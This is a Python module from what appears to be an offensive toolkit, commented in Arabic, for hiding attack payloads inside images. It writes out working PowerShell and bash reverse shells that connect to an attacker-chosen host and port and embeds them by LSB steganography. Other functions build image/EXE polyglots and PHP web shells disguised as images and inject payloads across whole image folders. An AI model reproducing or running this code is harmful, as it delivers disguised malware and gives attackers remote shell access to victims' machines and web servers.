#!/usr/bin/env python3
"""
Image Payload Injection Module
وحدة زرع الملفات الخبيثة في الصور
"""

import os
import sys
import struct
import base64
from PIL import Image
from ..core.image_stego import ImageSteganographyEngine

class ImagePayloadInjector:
    """محرك زرع البايلودات في الصور"""
    
    def __init__(self):
        self.engine = ImageSteganographyEngine()
    
    def inject_reverse_shell(self, image_path: str, lhost: str, lport: int, 
                            output_path: str = None, platform: str = "auto") -> str:
        """زرع Reverse Shell في صورة"""
        if output_path is None:
            base = os.path.splitext(image_path)[0]
            output_path = f"{base}_shell.png"
        
        # توليد Reverse Shell Script
        if platform in ["windows", "auto"]:
            ps_shell = f'''$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()'''
            shell_file = "reverse_shell.ps1"
        else:
            ps_shell = f'''#!/bin/bash
bash -i >& /dev/tcp/{lhost}/{lport} 0>&1
'''
            shell_file = "reverse_shell.sh"
        
        # حفظ الـ shell مؤقتاً
        with open(shell_file, 'w') as f:
            f.write(ps_shell)
        
        # إخفاؤه في الصورة
        result = self.engine.lsb_encode(image_path, shell_file, output_path, bits_per_channel=2)
        
        # تنظيف الملف المؤقت
        os.remove(shell_file)
        
        return result
    
    def inject_payload(self, image_path: str, payload_file: str, 
                      output_path: str = None, technique: str = "lsb") -> str:
        """زرع بايلود في صورة"""
        if output_path is None:
            base = os.path.splitext(image_path)[0]
            ext = os.path.splitext(payload_file)[1] or ".bin"
            output_path = f"{base}_injected.png"
        
        return self.engine.encode(technique, image_path, payload_file, output_path)
    
    def create_polyglot_image_executable(self, image_path: str, exe_path: str,
                                        output_path: str = None) -> str:
        """إنشاء صورة تعمل كـ EXE في نفس الوقت (Polyglot)"""
        if output_path is None:
            base = os.path.splitext(image_path)[0]
            output_path = f"{base}_polyglot.exe"
        
        return self.engine.polyglot_encode(image_path, exe_path, output_path, "png+exe")
    
    def create_image_web_shell(self, image_path: str, output_path: str = None) -> str:
        """إنشاء Web Shell داخل صورة"""
        if output_path is None:
            base = os.path.splitext(image_path)[0]
            output_path = f"{base}_webshell.php"
        
        return self.engine.create_image_shell(image_path, output_path, "php")
    
    def batch_process(self, image_dir: str, payload_dir: str, output_dir: str,
                     technique: str = "lsb") -> list:
        """معالجة مجلد كامل من الصور"""
        results = []
        
        os.makedirs(output_dir, exist_ok=True)
        
        for img_file in os.listdir(image_dir):
            if img_file.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                img_path = os.path.join(image_dir, img_file)
                
                for payload_file in os.listdir(payload_dir):
                    payload_path = os.path.join(payload_dir, payload_file)
                    
                    base_name = os.path.splitext(img_file)[0]
                    output_name = f"{base_name}_darkforge.png"
                    output_path = os.path.join(output_dir, output_name)
                    
                    try:
                        result = self.engine.encode(technique, img_path, payload_path, output_path)
                        results.append(result)
                        print(f"[+] {img_file} -> {output_name}")
                    except Exception as e:
                        print(f"[-] {img_file}: {e}")
        
        return results
